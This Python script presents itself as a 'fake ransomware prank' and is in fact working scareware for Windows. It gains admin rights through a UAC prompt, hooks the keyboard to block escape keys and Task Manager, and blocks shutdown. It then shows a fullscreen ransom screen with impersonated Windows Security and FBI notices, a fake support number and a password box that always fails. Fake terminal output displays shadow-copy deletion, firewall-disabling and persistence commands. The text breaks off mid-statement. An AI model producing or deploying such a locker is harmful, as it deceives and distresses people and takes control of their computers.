"""
fake_virus.py — MAXIMUM CHAOS fake ransomware prank.
  * Requests UAC admin elevation on launch
  * Blocks Win key / Win+L / Win+X in low-level keyboard hook
  * Registers Windows shutdown blocker (ShutdownBlockReasonCreate)
  * Alt+F4 / WM_DELETE_WINDOW → fake "SYSTEM LOCKED" password dialog
  * Fullscreen ransom screen — no prank reveal, real-looking countdown
  * Constant escalating popup storm
Secret exit  : type  4308  on keyboard (NOT shown anywhere in UI)
"""
import tkinter as tk
import threading, time, random, subprocess, os, sys, ctypes, ctypes.wintypes
import tempfile, winsound

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
shell32  = ctypes.windll.shell32
SW = user32.GetSystemMetrics(0)
SH = user32.GetSystemMetrics(1)

# ── UAC admin elevation ───────────────────────────────────────────────────────
def _is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

if not _is_admin():
    # Re-launch as admin via UAC prompt
    shell32.ShellExecuteW(None, 'runas', sys.executable,
                          f'"{os.path.abspath(__file__)}"', None, 1)
    sys.exit()

# ── Helpers ───────────────────────────────────────────────────────────────────
def beep_async(f, d):
    threading.Thread(target=lambda: kernel32.Beep(f, d), daemon=True).start()

def sys_sound(name):
    try: winsound.PlaySound(name, winsound.SND_ALIAS | winsound.SND_ASYNC)
    except: pass

# ── Secret exit + Win key block keyboard hook ────────────────────────────────
class _KHS(ctypes.Structure):
    _fields_ = [('vkCode',ctypes.c_uint32),('scanCode',ctypes.c_uint32),
                ('flags',ctypes.c_uint32),('time',ctypes.c_uint32),
                ('dwExtraInfo',ctypes.POINTER(ctypes.c_ulong))]

_HOOKP = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int,
                              ctypes.POINTER(_KHS))
_buf  = []
_held = set()   # tracks currently-held vkCodes for combo detection

def _kb(n, w, l):
    if n >= 0:
        v = l.contents.vkCode

        # Track key-down / key-up state for combo detection
        if w in (0x0100, 0x0104):   # WM_KEYDOWN / WM_SYSKEYDOWN
            _held.add(v)
        elif w in (0x0101, 0x0105): # WM_KEYUP   / WM_SYSKEYUP
            _held.discard(v)

        def _alt():  return bool(_held & {0x12, 0xA4, 0xA5})   # any Alt key
        def _ctrl(): return bool(_held & {0x11, 0xA2, 0xA3})   # any Ctrl key
        def _shift():return bool(_held & {0x10, 0xA0, 0xA1})   # any Shift key

        # ── Always block: Windows keys (LWin / RWin) ─────────────────────────
        # Blocks Start menu, Win+L lock, Win+X power menu, Win+D desktop, etc.
        if v in (0x5B, 0x5C):
            return 1

        # ── In full lockdown (Phase 4): block task-switcher / manager combos ──
        if _lockdown[0]:
            # Alt+Tab  — task switcher
            if v == 0x09 and _alt():
                return 1
            # Alt+F4  — close window
            if v == 0x73 and _alt():
                return 1
            # Alt+Esc — cycle windows without showing switcher
            if v == 0x1B and _alt():
                return 1
            # Ctrl+Esc  — alternate Start menu
            if v == 0x1B and _ctrl() and not _alt():
                return 1
            # Ctrl+Shift+Esc  — opens Task Manager directly
            if v == 0x1B and _ctrl() and _shift():
                return 1
            # Escape alone — block so they can't dismiss fullscreen popups
            if v == 0x1B and not _ctrl() and not _alt():
                return 1
            # F1-F12 block — prevents F5 refresh, F11 fullscreen tricks, etc.
            if 0x70 <= v <= 0x7B and not (v == 0x73 and _alt()):  # keep Alt+F4 path above
                return 1

        # ── Secret 4-digit exit sequence: 4308 ──────────────────────────────
        if w == 0x0100 and 0x30 <= v <= 0x39:
            _buf.append(chr(v))
            if len(_buf) > 4: _buf.pop(0)
            if ''.join(_buf) == '4308':
                os._exit(0)

    return user32.CallNextHookEx(None, n, w, l)

_kbp = _HOOKP(_kb)
_lockdown = [False]   # set True once phase4 starts

def _hook_thread():
    user32.SetWindowsHookExW(13, _kbp, None, 0)
    m = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(m), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(m))
        user32.DispatchMessageW(ctypes.byref(m))
threading.Thread(target=_hook_thread, daemon=True).start()

# ── Root window (hidden — only used for after() scheduling) ──────────────────
root = tk.Tk()
root.withdraw()
root.overrideredirect(True)

# ── Shutdown blocker ──────────────────────────────────────────────────────────
def _block_shutdown(hwnd):
    """Tell Windows not to shut down while we're running. Shows scary reason."""
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(
            hwnd,
            "⚠  RANSOMWARE DECRYPTION IN PROGRESS  —  "
            "SHUTTING DOWN NOW WILL CAUSE PERMANENT LOSS OF ALL FILES")
    except: pass

def _on_close_attempt():
    """Called when WM_DELETE_WINDOW fires (Alt+F4 on non-overrideredirect, shutdown)."""
    _show_lockout_dialog()

root.protocol("WM_DELETE_WINDOW", _on_close_attempt)

# ── Fake file / country / process data ───────────────────────────────────────
SYSTEM_FILES = [
    r'C:\Windows\System32\ntoskrnl.exe',      r'C:\Users\Documents\passwords.txt',
    r'C:\Windows\System32\drivers\tcpip.sys', r'C:\Users\Pictures\family_photos.zip',
    r'C:\Windows\System32\lsass.exe',         r'C:\Users\Desktop\bank_details.xlsx',
    r'C:\Program Files\Google\Chrome\chrome.exe',r'C:\Users\AppData\Roaming\Discord\token.db',
    r'C:\Windows\System32\config\SAM',        r'C:\Users\Documents\resume_final.docx',
    r'C:\Windows\SysWOW64\msvcrt.dll',        r'C:\Users\Videos\private_recordings.mp4',
    r'C:\Windows\System32\winlogon.exe',      r'C:\Users\AppData\Local\Google\Passwords',
    r'C:\Program Files\Steam\userdata\config',r'C:\Users\Documents\crypto_wallet.dat',
    r'C:\Windows\System32\kernel32.dll',      r'C:\Users\AppData\Roaming\FileZilla\sitemanager.xml',
    r'C:\Windows\System32\svchost.exe',       r'C:\Users\Documents\tax_return_2024.pdf',
    r'C:\Program Files\Discord\Discord.exe',  r'C:\Users\AppData\Local\Microsoft\Edge\Passwords',
    r'C:\Windows\System32\explorer.exe',      r'C:\Users\OneDrive\important_backup.zip',
    r'C:\Windows\System32\spoolsv.exe',       r'C:\Users\Desktop\investment_portfolio.xlsx',
    r'C:\Users\Pictures\graduation_2022.jpg', r'C:\Users\Documents\id_scan_front.jpg',
    r'C:\Users\Desktop\minecraft_saves.zip',  r'C:\Users\Documents\diary_private.txt',
    r'C:\Users\AppData\Roaming\Steam\config\loginusers.vdf',
    r'C:\Users\Documents\credit_card_info.txt',
    r'C:\Windows\System32\drivers\ndis.sys',
    r'C:\Users\AppData\Local\Microsoft\Credentials\Primary',
]
EXTENSIONS = ['.KRAKEN', '.LOCKED', '.encrypted', '.crypt', '.darkness', '.zero', '.RANSOM']
COUNTRIES   = ['Russia','North Korea','Romania','Ukraine','Brazil','China','Iran','Belarus']
C2_IPS      = ['185.220.101.47','91.108.4.0','104.244.72.0','45.142.212.100',
                '185.56.83.83','195.123.241.0','62.173.145.0','77.83.247.12',
                '193.32.162.0','37.120.247.0','198.54.117.0']
PROCESSES   = ['system32.vbs','svhost32.exe','winsecure.dll','keylog_svc.exe',
               'netcap.bat','cryptomine.exe','rdp_backdoor.dll','stealer.py',
               'shadow_delete.exe','reg_persist.bat','webcam_capture.exe','exfil.ps1']
PHOTO_FILES = [
    'IMG_8823.jpg','selfie_2023.png','family_xmas.jpg','holiday_ibiza.jpg',
    'passport_scan.jpg','driving_license.jpg','IMG_4401.jpg','graduation.jpg',
    'bank_statement_photo.jpg','friends_party.jpg','private_01.jpg','private_02.jpg',
]
BTC_ADDR    = '1Kr6QSydW9bFQG1mXiPNNu6WpJGmUa9i1g'
BTC_AMOUNT  = f'{random.uniform(0.28,0.34):.4f}'

# ── Window factory ────────────────────────────────────────────────────────────
def toplevel(title='', x=0, y=0, w=SW, h=SH, bg='#1a0000', topmost=True, od=True):
    win = tk.Toplevel()
    win.title(title); win.configure(bg=bg)
    if od: win.overrideredirect(True)
    win.geometry(f'{w}x{h}+{x}+{y}')
    if topmost: win.attributes('-topmost', True)
    return win

def lbl(parent, text, font=('Consolas',11), fg='#ff4444', bg=None, **kw):
    bg = bg or parent.cget('bg')
    return tk.Label(parent, text=text, font=font, fg=fg, bg=bg, **kw)

def progressbar(parent, width=600, height=22, bg='#111', fill='#cc0000'):
    c = tk.Canvas(parent, width=width, height=height, bg=bg,
                  highlightthickness=1, highlightbackground='#440000')
    c.pack(pady=3)
    bar = c.create_rectangle(0, 0, 0, height, fill=fill, outline='')
    pct = c.create_text(width//2, height//2, text='0%',
                        fill='white', font=('Consolas', 9, 'bold'))
    return c, bar, pct, width

def animate_bar(canvas, bar, pct_item, bar_w, duration_ms=4000,
                color='#cc0000', done_cb=None, label_fmt='{p}%'):
    steps = 80
    def _step(i):
        if not canvas.winfo_exists(): return
        p = int(i / steps * 100)
        canvas.itemconfig(bar, fill=color)
        canvas.coords(bar, 0, 0, int(bar_w * i / steps), 99)
        canvas.itemconfig(pct_item, text=label_fmt.format(p=p))
        if i < steps:  canvas.after(duration_ms // steps, lambda: _step(i+1))
        elif done_cb:  canvas.after(200, done_cb)
    _step(0)

# ── Lockout password dialog (shown on any close attempt during phase4) ────────
def _show_lockout_dialog():
    """Fake 'SYSTEM LOCKED' dialog — shown when user tries to close/shutdown."""
    if not _lockdown[0]: return
    sys_sound('SystemHand')
    d = toplevel(w=540, h=320, bg='#0a0000',
                 x=SW//2-270, y=SH//2-160)
    tk.Frame(d, bg='#cc0000', height=52).pack(fill='x')
    lbl(tk.Frame(d.children[list(d.children)[-1]], bg='#cc0000'),
        '  🔒  SYSTEM LOCKDOWN — DECRYPTION REQUIRED',
        font=('Segoe UI',12,'bold'), fg='white', bg='#cc0000').pack(side='left', pady=14)

    bd = tk.Frame(d, bg='#0a0000'); bd.pack(fill='both', expand=True, padx=20, pady=12)
    lbl(bd, 'Access denied. This system is under active ransomware control.',
        font=('Consolas',10), fg='#ff6600', bg='#0a0000').pack(anchor='w', pady=4)
    lbl(bd, 'Enter decryption password to release system lock:',
        font=('Consolas',10), fg='#ffaa00', bg='#0a0000').pack(anchor='w', pady=2)

    pf = tk.Frame(bd, bg='#0a0000'); pf.pack(anchor='w', pady=6)
    e = tk.Entry(pf, font=('Consolas',13), bg='#1a0000', fg='white',
                 insertbackground='white', show='●', width=28,
                 relief='flat', highlightthickness=1, highlightbackground='#cc0000')
    e.pack(side='left', padx=(0,8)); e.focus_set()

    err_v = tk.StringVar()
    lbl(bd, textvariable=err_v, font=('Consolas',10,'bold'),
        fg='#ff2200', bg='#0a0000').pack(anchor='w')

    attempt = [0]
    def _try(_e=None):
        attempt[0] += 1
        val = e.get().strip()
        if val == '':
            err_v.set('⛔  Enter a password.')
            return
        # Wrong answer every time — they'll never guess
        e.delete(0, 'end')
        if attempt[0] >= 3:
            err_v.set(f'⛔  INVALID KEY — ATTEMPT {attempt[0]} LOGGED — AUTHORITIES NOTIFIED')
            sys_sound('SystemHand')
            threading.Thread(target=lambda:[beep_async(880,80), time.sleep(.1),
                                            beep_async(660,80)], daemon=True).start()
        else:
            err_v.set(f'⛔  INCORRECT DECRYPTION KEY  (attempt {attempt[0]}/3)')
            sys_sound('SystemExclamation')

    e.bind('<Return>', _try)
    tk.Button(bd, text='UNLOCK SYSTEM', command=_try,
              font=('Segoe UI',11,'bold'), bg='#880000', fg='white',
              relief='flat', padx=14, pady=6).pack(anchor='w', pady=6)

    # Auto-close after 12s if they ignore it
    d.after(12000, lambda: d.destroy() if d.winfo_exists() else None)

# ══════════════════════════════════════════════════════════════════════════════
# POPUP LIBRARY — spawns randomly throughout all phases
# ══════════════════════════════════════════════════════════════════════════════
def _popup_defender_mini():
    msgs = [
        ('KEYLOGGER ACTIVE',    'All keystrokes captured.\nSending to 185.220.101.47:8443'),
        ('WEBCAM ACCESSED',     'Remote camera access established.\nStreaming live to attacker.'),
        ('REGISTRY MODIFIED',   r'HKLM\Run persistence key installed.'
                                '\nMalware survives reboot.'),
        ('DATA EXFILTRATION',   'Uploading encrypted archive to TOR network.\nETA: 4 min'),
        ('FIREWALL DISABLED',   'Windows Firewall rules cleared.\nAll ports exposed.'),
        ('SHADOW COPIES DELETED','vssadmin delete shadows /all /quiet\n— command executed successfully.'),
        ('ANTIVIRUS KILLED',    'Windows Defender service terminated.\nReal-time protection: OFF'),
        ('BACKUP DELETED',      r'C:\Users\Backup — permanently deleted.'
                                '\n267 files irrecoverable.'),
    ]
    title, msg = random.choice(msgs)
    pw = toplevel(w=400, h=148, bg='#1a0000',
                  x=random.randint(0, max(1,SW-420)),
                  y=random.randint(0, max(1,SH-170)))
    lbl(pw, f'  ⛔  {title}', font=('Consolas',11,'bold'),
        fg='#ff0000', bg='#1a0000').pack(anchor='w', pady=(10,2), padx=12)
    lbl(pw, msg, font=('Consolas',9), fg='#ff6600',
        bg='#1a0000', justify='left').pack(anchor='w', padx=16)
    pw.after(random.randint(3500,5500), lambda: pw.destroy() if pw.winfo_exists() else None)
    sys_sound('SystemExclamation')

def _popup_process_list():
    pw = toplevel(w=520, h=268, bg='#0a0a1a',
                  x=SW//2-260, y=random.randint(80, max(81,SH-300)))
    lbl(pw, '  ⚠  MALICIOUS PROCESSES RUNNING — CANNOT TERMINATE',
        font=('Consolas',11,'bold'), fg='#aa44ff', bg='#0a0a1a').pack(anchor='w', pady=8, padx=8)
    for p in random.sample(PROCESSES, min(6,len(PROCESSES))):
        pid = random.randint(1000, 9999)
        cpu = random.randint(12, 98)
        mem = random.randint(24, 512)
        lbl(pw, f'  PID {pid}  {p:<32}  CPU:{cpu}%  MEM:{mem}MB  [ROOTKIT]',
            font=('Consolas',8), fg='#ff44aa', bg='#0a0a1a').pack(anchor='w')
    lbl(pw, '\n  Termination blocked — kernel-level rootkit protection.',
        font=('Consolas',9,'bold'), fg='#ff2200', bg='#0a0a1a').pack(anchor='w', padx=8)
    pw.after(5500, lambda: pw.destroy() if pw.winfo_exists() else None)

def _popup_cmd_flash():
    """Fake CMD window running scary commands."""
    pw = toplevel(w=640, h=280, bg='#0c0c0c',
                  x=random.randint(0, max(1,SW-660)),
                  y=random.randint(0, max(1,SH-300)))
    lbl(pw, 'C:\\Windows\\System32\\cmd.exe',
        font=('Consolas',9), fg='#cccccc', bg='#0c0c0c').pack(anchor='w', padx=4, pady=2)
    tk.Frame(pw, bg='#333', height=1).pack(fill='x')
    lines = [
        f'Microsoft Windows [Version 10.0.{random.randint(19000,19045)}.{random.randint(1000,3000)}]',
        '(c) Microsoft Corporation. All rights reserved.',
        '',
        'C:\\Windows\\system32> vssadmin delete shadows /all /quiet',
        'Successfully deleted all shadow copies.',
        f'C:\\Windows\\system32> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /d "{os.path.abspath(__file__)}"',
        'The operation completed successfully.',
        'C:\\Windows\\system32> netsh advfirewall set allprofiles state off',
        'Ok.',
        f'C:\\Windows\\system32> cipher /e /s:C:\\Users /a',
        'Encrypting files in C:\\Users\\...',
        f'  {random.randint(800,4000)} file(s) [or directorie(s)] within 1 directorie(s) were encrypted.',
        '',
        'C:\\Windows\\system32> _',
    ]
    tf = tk.Text(pw, bg='#0c0c0c', fg='#cccccc', font=('Consolas',9),
                 relief='flat', state='normal', height=14)
    tf.pack(fill='both', expand=True, padx=4)

    def _type_lines(lines, i=0, j=0):
        if not pw.winfo_exists(): return
        if i >= len(lines):
            return
        line = lines[i]
        if j <= len(line):
            tf.config(state='normal')
            tf.delete('end-1c linestart', 'end')
            tf.insert('end', line[:j])
            tf.config(state='disabled')
            pw.after(random.randint(8, 35), lambda: _type_lines(lines, i, j+1))
        else:
            tf.config(state='normal')
            tf.insert('end', '\n')
            tf.config(state='disabled')
            tf.yview_moveto(1.0)
            pw.after(80, lambda: _type_lines(lines, i+1, 0))

    _type_lines(lines)
    pw.after(9000, lambda: pw.destroy() if pw.winfo_exists() else None)

def _popup_photo_upload():
    pw = toplevel(w=460, h=220, bg='#00001a',
                  x=random.randint(0, max(1,SW-480)),
                  y=random.randint(0, max(1,SH-240)))
    lbl(pw, '  📷  UPLOADING PHOTOS TO DARK WEB SERVER',
        font=('Consolas',11,'bold'), fg='#ff4488', bg='#00001a').pack(anchor='w', pady=8, padx=8)
    lbl(pw, f'  Destination: darkfiles.onion/{random.randint(10000,99999)}',
        font=('Consolas',9), fg='#8888ff', bg='#00001a').pack(anchor='w', padx=8)
    lb = tk.Listbox(pw, bg='#00001a', fg='#ff88cc', font=('Consolas',8),
                    relief='flat', highlightthickness=0, height=6)
    lb.pack(fill='x', padx=8)
    photos = random.sample(PHOTO_FILES, min(6, len(PHOTO_FILES)))
    for p in photos:
        lb.insert('end', f'  ✓ UPLOADED  {p}')
    spd_v = tk.StringVar(value='Upload speed: initializing...')
    lbl(pw, textvariable=spd_v, font=('Consolas',8,'bold'),
        fg='#ff4444', bg='#00001a').pack(anchor='w', padx=8)
    def _tick_speed(n=0):
        if not pw.winfo_exists(): return
        spd_v.set(f'Upload speed: {random.uniform(0.8,4.2):.1f} MB/s  |  '
                  f'{len(photos)+n} files sent')
        pw.after(600, lambda: _tick_speed(n+1))
    _tick_speed()
    pw.after(7000, lambda: pw.destroy() if pw.winfo_exists() else None)

def _popup_fbi():
    pw = toplevel(w=500, h=260, bg='#000028',
                  x=SW//2-250, y=SH//2-130)
    lbl(pw, '  🏛  FEDERAL BUREAU OF INVESTIGATION',
        font=('Consolas',12,'bold'), fg='#4488ff', bg='#000028').pack(anchor='w', pady=10, padx=10)
    lbl(pw, '─'*58, font=('Consolas',8), fg='#224488', bg='#000028').pack(anchor='w', padx=10)
    lbl(pw, 'NOTICE: Ransomware activity detected on this device.\n'
            'Your IP address has been logged and reported to:\n'
            '  • FBI Cyber Division  •  Interpol Cybercrime\n'
            '  • DHS CISA  •  NCA National Crime Agency\n\n'
            'A case file has been opened. Reference: CY-2025-448821',
        font=('Consolas',9), fg='#aaccff', bg='#000028', justify='left').pack(anchor='w', padx=14)
    pw.after(6500, lambda: pw.destroy() if pw.winfo_exists() else None)
    sys_sound('SystemExclamation')

def _popup_thermal():
    pw = toplevel(w=380, h=160, bg='#1a0800',
                  x=SW-400, y=SH-180)
    lbl(pw, '  🌡  THERMAL WARNING',
        font=('Consolas',11,'bold'), fg='#ff6600', bg='#1a0800').pack(anchor='w', pady=8, padx=10)
    temp = random.randint(94, 107)
    lbl(pw, f'CPU temperature: {temp}°C  ⚠  CRITICAL',
        font=('Consolas',10), fg='#ff4400', bg='#1a0800').pack(anchor='w', padx=14)
    lbl(pw, f'GPU temperature: {random.randint(88,99)}°C  ⚠  HIGH',
        font=('Consolas',10), fg='#ff6600', bg='#1a0800').pack(anchor='w', padx=14)
    lbl(pw, 'Cause: cryptomining process consuming 100% resources.',
        font=('Consolas',8), fg='#ff8800', bg='#1a0800').pack(anchor='w', padx=14)
    pw.after(4000, lambda: pw.destroy() if pw.winfo_exists() else None)

def _popup_scam_number():
    pw = toplevel(w=560, h=200, bg='#1a0000',
                  x=SW//2-280, y=SH-220)
    lbl(pw, '  ☎  CALL MICROSOFT SUPPORT IMMEDIATELY',
        font=('Consolas',12,'bold'), fg='#ff4444', bg='#1a0000').pack(anchor='w', pady=10, padx=12)
    lbl(pw, 'Your computer has been blocked due to a ransomware infection.\n'
            'DO NOT restart your computer or close this window.\n'
            'Call our certified technicians immediately:',
        font=('Consolas',9), fg='#ffaa44', bg='#1a0000', justify='left').pack(anchor='w', padx=16)
    lbl(pw, f'  ☎  1-800-{random.randint(200,900)}-{random.randint(1000,9999)}  (Toll Free)',
        font=('Consolas',14,'bold'), fg='#ffff00', bg='#1a0000').pack(anchor='w', padx=16)
    pw.after(8000, lambda: pw.destroy() if pw.winfo_exists() else None)
    sys_sound('SystemExclamation')

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1 — Windows Defender CRITICAL THREAT
# ══════════════════════════════════════════════════════════════════════════════
def phase1_defender():
    sys_sound('SystemHand')
    w = toplevel(w=600, h=330, bg='#1e1e1e', x=SW//2-300, y=SH//2-165)

    hdr = tk.Frame(w, bg='#d83b01', height=52); hdr.pack(fill='x'); hdr.pack_propagate(False)
    lbl(hdr, '  ⚠  Windows Security  —  CRITICAL THREAT DETECTED',
        font=('Segoe UI',12,'bold'), fg='white', bg='#d83b01').pack(side='left', pady=14)
    tk.Frame(w, bg='#555', height=1).pack(fill='x')

    body = tk.Frame(w, bg='#1e1e1e'); body.pack(fill='both', expand=True, padx=22, pady=14)
    lbl(body, 'Threat:    Ransomware:Win32/KRAKEN.4  ●  Trojan:Win32/Zbot.AEK.SEVERE',
        font=('Consolas',10,'bold'), fg='#ff5533', bg='#1e1e1e').pack(anchor='w')
    lbl(body, 'Severity:  ██████████████  CRITICAL — SPREADING',
        fg='#ff2200', font=('Consolas',10), bg='#1e1e1e').pack(anchor='w', pady=2)
    lbl(body, 'Status:    Active encryption in progress on system drive...',
        fg='#ffaa00', font=('Consolas',10), bg='#1e1e1e').pack(anchor='w')
    lbl(body, 'Network:   Outbound data transfer detected → 185.220.101.47',
        fg='#ff8800', font=('Consolas',10), bg='#1e1e1e').pack(anchor='w')
    lbl(body, 'Action:    IMMEDIATE REMOVAL REQUIRED',
        fg='#ff2200', font=('Consolas',10,'bold'), bg='#1e1e1e').pack(anchor='w', pady=(4,0))

    tk.Frame(body, bg='#444', height=1).pack(fill='x', pady=8)
    bf = tk.Frame(body, bg='#1e1e1e'); bf.pack(fill='x')

    go = lambda: (w.destroy(), root.after(600, phase2_scan))
    tk.Button(bf, text='Remove Now', font=('Segoe UI',11,'bold'),
              bg='#d83b01', fg='white', relief='flat', padx=18, pady=8,
              command=go).pack(side='left', padx=6)
    tk.Button(bf, text='Quarantine', font=('Segoe UI',10),
              bg='#333', fg='#aaa', relief='flat', padx=10, pady=8,
              command=go).pack(side='left', padx=6)
    tk.Button(bf, text='Ignore (not recommended)', font=('Segoe UI',9),
              bg='#222', fg='#666', relief='flat', padx=10, pady=8,
              command=go).pack(side='left', padx=6)

    root.after(9000,  lambda: w.destroy() if w.winfo_exists() else None)
    root.after(9500,  phase2_scan)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 2 — Live file encryption terminal
# ══════════════════════════════════════════════════════════════════════════════
def phase2_scan():
    sys_sound('SystemExclamation')
    w = toplevel(w=820, h=560, bg='#0d0d0d', x=SW//2-410, y=SH//2-280)

    hdr = tk.Frame(w, bg='#880000', height=36); hdr.pack(fill='x'); hdr.pack_propagate(False)
    lbl(hdr, '  ⚠  RANSOMWARE:WIN32/KRAKEN — LIVE ENCRYPTION MONITOR',
        font=('Consolas',10,'bold'), fg='white', bg='#880000').pack(side='left', pady=8)
    tk.Frame(w, bg='#440000', height=2).pack(fill='x')

    lf = tk.Frame(w, bg='#0d0d0d'); lf.pack(fill='both', expand=True, padx=16, pady=8)
    sb = tk.Scrollbar(lf); sb.pack(side='right', fill='y')
    lb = tk.Listbox(lf, yscrollcommand=sb.set, bg='#050505', fg='#ff3300',
                    font=('Consolas',8), selectbackground='#440000',
                    relief='flat', highlightthickness=0)
    lb.pack(side='left', fill='both', expand=True); sb.config(command=lb.yview)

    sv = tk.StringVar(value='Initializing KRAKEN ransomware engine...')
    lbl(w, textvariable=sv, font=('Consolas',9), fg='#ff8800', bg='#0d0d0d').pack(anchor='w', padx=16)
    c2, bar2, pct2, bw2 = progressbar(w, width=788, fill='#cc0000')

    stats_v = tk.StringVar(value='Files encrypted: 0  |  Data staged: 0 KB  |  Keys generated: 0')
    lbl(w, textvariable=stats_v, font=('Consolas',9),
        fg='#ff4444', bg='#0d0d0d').pack(anchor='w', padx=16, pady=(0,8))

    files_done = [0]; data_kb = [0]; keys = [0]
    flist = (SYSTEM_FILES * 4); random.shuffle(flist)

    def _scan_loop():
        for fp in flist:
            if not w.winfo_exists(): return
            time.sleep(random.uniform(0.045, 0.13))
            ext = random.choice(EXTENSIONS)
            kb  = random.randint(8, 8192)
            data_kb[0] += kb; files_done[0] += 1
            if random.random() < 0.3: keys[0] += 1
            clr = random.choice(['#ff1100','#ff4400','#ff6600','#ffaa00','#ff8800'])
            def _add(n=fp+ext, c=clr, k=kb):
                if not w.winfo_exists(): return
                lb.insert('end', f'  [AES-256]  {n}  → ENCRYPTED  [{k:,} KB]')
                lb.itemconfig(lb.size()-1, fg=c)
                lb.yview_moveto(1.0)
                stats_v.set(f'Files encrypted: {files_done[0]:,}  |  '
                            f'Data staged: {data_kb[0]//1024:,} MB  |  '
                            f'Keys generated: {keys[0]}')
                sv.set(f'Encrypting: {(fp+ext)[:62]}...')
            root.after(0, _add)
        root.after(0, lambda: w.destroy() if w.winfo_exists() else None)
        root.after(600, phase3_network)

    animate_bar(c2, bar2, pct2, bw2, duration_ms=int(len(flist)*95),
                color='#cc0000', label_fmt='ENCRYPTING {p}%')
    threading.Thread(target=_scan_loop, daemon=True).start()

    # Popup storm during scan
    for d, fn in [(1000,_popup_defender_mini),(2500,_popup_cmd_flash),
                  (5000,_popup_process_list),(7500,_popup_defender_mini),
                  (10000,_popup_photo_upload),(13000,_popup_defender_mini)]:
        root.after(d, fn)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 3 — Network exfiltration live monitor
# ══════════════════════════════════════════════════════════════════════════════
def phase3_network():
    def _beeps():
        for f in [200,150,100,80,200,150]:
            kernel32.Beep(f,150); time.sleep(.08)
    threading.Thread(target=_beeps, daemon=True).start()

    w = toplevel(w=860, h=460, bg='#000d00', x=SW//2-430, y=SH//2-230)
    lbl(w, '▓▓  LIVE NETWORK EXFILTRATION — SENDING TO DARK WEB SERVERS  ▓▓',
        font=('Consolas',12,'bold'), fg='#00ff44', bg='#000d00').pack(pady=(12,4))
    tk.Frame(w, bg='#004400', height=1).pack(fill='x', padx=20)

    lf = tk.Frame(w, bg='#000d00'); lf.pack(fill='both', expand=True, padx=20, pady=6)
    lb = tk.Listbox(lf, bg='#000d00', fg='#00ff44', font=('Consolas',9),
                    relief='flat', highlightthickness=0)
    lb.pack(fill='both', expand=True)

    speed_v = tk.StringVar(value='Connecting to TOR network...')
    lbl(w, textvariable=speed_v, font=('Consolas',11,'bold'),
        fg='#ff4400', bg='#000d00').pack(pady=4)

    cont_btn = tk.Button(w, text='[ CONTINUE → ]', font=('Consolas',12,'bold'),
                         bg='#002200', fg='#00ff44', relief='flat', padx=20, pady=8,
                         command=lambda: (w.destroy(), root.after(300, phase4_ransom)))
    cont_btn.pack(pady=6)
    # Auto-advance after enough exfil
    cont_btn.pack_forget()

    total_mb = [0]
    def _net_loop():
        time.sleep(0.8)
        countries = (COUNTRIES * 5); random.shuffle(countries)
        for i, country in enumerate(countries):
            if not w.winfo_exists(): return
            ip   = random.choice(C2_IPS)
            mb   = random.uniform(0.6, 9.8)
            total_mb[0] += mb
            port = random.choice([443,8443,4444,6881,1337,31337,9001,2222])
            prot = random.choice(['TLS1.3 AES-256','RSA-4096','RC4-MD5','ChaCha20'])
            data = random.choice(['credentials.db','photos_archive.zip',
                                  'passwords.txt','discord_tokens.txt',
                                  'browser_history.sqlite','wallet.dat',
                                  'ssh_keys.zip','cookies.sqlite'])
            msg  = (f'  ▶ {ip}:{port}  [{country:<12}]  '
                    f'{mb:5.1f} MB  [{prot}]  {data}  ✓')
            def _add(m=msg, t=total_mb[0]):
                if not w.winfo_exists(): return
                lb.insert('end', m)
                lb.itemconfig(lb.size()-1,
                              fg=random.choice(['#00ff44','#44ff88','#ffff44','#ff8844']))
                lb.yview_moveto(1.0)
                spd = random.uniform(1.4, 11.2)
                speed_v.set(f'⬆ Upload: {spd:.1f} MB/s  |  '
                            f'Total exfiltrated: {t:.1f} MB  |  '
                            f'Destination: {random.choice(COUNTRIES)}')
            root.after(0, _add)
            if i == len(countries)//2:
                root.after(0, lambda: cont_btn.pack(pady=6) if w.winfo_exists() else None)
            time.sleep(random.uniform(0.18, 0.45))
        root.after(0, lambda: w.destroy() if w.winfo_exists() else None)
        root.after(500, phase4_ransom)

    threading.Thread(target=_net_loop, daemon=True).start()
    root.after(2000, _popup_defender_mini)
    root.after(5000, _popup_fbi)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 4 — FULLSCREEN RANSOMWARE LOCKDOWN  (no prank reveal)
# ══════════════════════════════════════════════════════════════════════════════
def phase4_ransom():
    def _beeps():
        for f in [880,660,440,330,220,880,660,440,220,880]:
            kernel32.Beep(f, 80); time.sleep(0.045)
    threading.Thread(target=_beeps, daemon=True).start()
    sys_sound('SystemHand')

    _lockdown[0] = True   # enable ESC block + password dialog on close

    w = toplevel(w=SW, h=SH, bg='#000000', x=0, y=0)
    _phase4_win[0] = w

    # ── Register shutdown blocker on this window ──────────────────────────────
    root.after(100, lambda: _block_shutdown(w.winfo_id()))

    # ── Pulsing red border canvas ──────────────────────────────────────────────
    border_c = tk.Canvas(w, width=SW, height=SH, bg='#000000', highlightthickness=0)
    border_c.place(x=0, y=0)
    _border_alpha = [0]
    def _pulse_border():
        if not w.winfo_exists(): return
        _border_alpha[0] = (_border_alpha[0] + 8) % 512
        intensity = abs(_border_alpha[0] - 256)
        r = min(255, 40 + intensity)
        color = f'#{r:02x}0000'
        border_c.delete('border')
        for t in range(6):
            border_c.create_rectangle(t, t, SW-t, SH-t,
                                      outline=color, width=1, tags='border')
        w.after(30, _pulse_border)
    _pulse_border()

    # ── Main content frame ────────────────────────────────────────────────────
    cf = tk.Frame(w, bg='#000000'); cf.place(relx=.5, rely=.5, anchor='center')

    skull_f = tk.Frame(cf, bg='#000000'); skull_f.pack(pady=(0,6))
    lbl(skull_f, '☠  ☠  ☠', font=('Segoe UI', max(28,SW//38)),
        fg='#cc0000', bg='#000000').pack()

    lbl(cf, 'YOUR FILES HAVE BEEN ENCRYPTED',
        font=('Impact', max(42, SW//22)), fg='#ff0000', bg='#000000').pack()

    lbl(cf, '━' * min(70, SW//14),
